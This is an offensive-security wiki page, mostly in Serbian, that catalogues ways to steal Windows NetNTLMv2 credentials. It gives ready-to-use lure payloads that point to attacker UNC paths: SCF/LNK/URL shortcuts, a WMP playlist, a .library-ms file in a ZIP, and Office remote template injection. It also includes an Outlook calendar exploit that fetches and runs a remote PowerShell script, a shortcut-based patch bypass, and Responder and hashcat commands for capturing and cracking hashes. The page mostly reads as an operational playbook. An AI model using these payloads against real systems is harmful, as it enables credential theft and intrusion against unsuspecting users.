# Mesta za krađu NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Pogledajte sve sjajne ideje sa [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — od preuzimanja microsoft word fajla online do ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md i [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Upisiv SMB share + UNC mamci koje pokreće Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Ako možete **pisati na share koji korisnici ili zakazani jobovi pregledaju u Explorer-u**, ubacite fajlove čija metadata ukazuje na vaš UNC (npr. `\\ATTACKER\share`). Renderovanje foldera pokreće **implicit SMB authentication** i leaks a **NetNTLMv2** ka vašem listeneru.

1. **Generišite mamce** (obuhvata SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Ostavite ih na writable share** (bilo koju fasciklu koju žrtva otvori):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Slušaj i crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows može istovremeno dohvatiti više fajlova; sve što Explorer prikazuje u preview-u (`BROWSE TO FOLDER`) ne zahteva klikove.

### Windows Media Player plejliste (.ASX/.WAX)

Ako možeš naterati metu da otvori ili pregleda Windows Media Player plejlistu koju kontrolišeš, možeš leak Net‑NTLMv2 tako što ćeš usmeriti unos na UNC path. WMP će pokušati da preuzme referencirani media preko SMB i implicitno će se autentifikovati.

Primer payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Tok prikupljanja i crackinga:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-ugrađeni .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer nesigurno obrađuje .library-ms fajlove kada se otvore direktno iz ZIP arhive. Ako definicija biblioteke pokazuje na udaljenu UNC putanju (npr. \\attacker\share), samo pregledavanje/pokretanje .library-ms unutar ZIP-a natera Explorer da izlista UNC i pošalje NTLM autentifikaciju napadaču. Ovo daje NetNTLMv2 koji se može crack-ovati offline ili potencijalno relayed.

Minimalan .library-ms koji pokazuje na napadačev UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- Create the .library-ms file with the XML above (set your IP/hostname).
- Zip it (on Windows: Send to → Compressed (zipped) folder) and deliver the ZIP to the target.
- Run an NTLM capture listener and wait for the victim to open the .library-ms from inside the ZIP.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows je obrađivao extended MAPI property PidLidReminderFileParameter u stavkama kalendara. Ako to svojstvo pokazuje na UNC putanju (npr. \\attacker\share\alert.wav), Outlook bi kontaktirao SMB share kada se podsetnik aktivira, leaking korisnikov Net‑NTLMv2 bez ikakvog klika. Ovo je zakrpljeno 14. marta 2023, ali je i dalje veoma relevantno za nasleđene/neizmenjene flote i za istorijski odgovor na incidente.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener strana:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Napomene
- Žrtvi je potrebno samo Outlook for Windows da radi kada se podsetnik pokrene.
- Leak daje Net‑NTLMv2 pogodan za offline cracking ili relay (nije pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer prikazuje ikone prečica automatski. Nedavno istraživanje je pokazalo da čak i nakon Microsoft‑ove april 2025 zakrpe za UNC‑icon shortcuts, i dalje je moguće pokrenuti NTLM autentifikaciju bez klika tako što se cilj prečice hostuje na UNC putanji dok je ikona lokalna (bypass zakrpe dodeljen CVE‑2025‑50154). Samo pregledanje foldera navodi Explorer da preuzme metapodatke sa udaljenog cilja, emitujući NTLM napadačevom SMB serveru.

Minimalni Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Payload prečice programa (.lnk) putem PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- Stavite prečicu u ZIP i navedite žrtvu da je pregleda.
- Postavite prečicu na deljenu mapu sa pravom pisanja koju će žrtva otvoriti.
- Kombinujte sa drugim lure files u istoj fascikli tako da Explorer pregleda stavke.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office dokumenti mogu referencirati eksterni template. Ako postavite priloženi template na UNC putanju, otvaranje dokumenta će se autentifikovati na SMB.

Minimalne DOCX izmene relacija (inside word/):

1) Izmenite word/settings.xml i dodajte referencu na priloženi template:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Izmenite word/_rels/settings.xml.rels i podesite rId1337 da pokazuje na vaš UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Prepakujte u .docx i dostavite. Pokrenite SMB capture listener i sačekajte otvaranje.

Za post-capture ideje o relayingu ili zloupotrebi NTLM, pogledajte:

{{#ref}}
README.md
{{#endref}}


## Reference
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
